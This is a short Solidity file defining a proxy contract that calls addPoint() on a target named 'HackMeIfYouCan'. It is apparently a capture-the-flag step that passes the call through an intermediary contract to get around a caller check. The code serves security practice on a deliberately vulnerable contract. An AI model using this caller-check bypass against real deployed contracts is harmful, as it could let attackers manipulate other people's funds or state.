// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;

import "./Contract.sol";

contract Proxy {
    HackMeIfYouCan hackMeIfYouCan;

    constructor(address contractAddr){
        hackMeIfYouCan = HackMeIfYouCan(payable(contractAddr));
    }

    function callAddPoint() external{
        hackMeIfYouCan.addPoint();
    }
}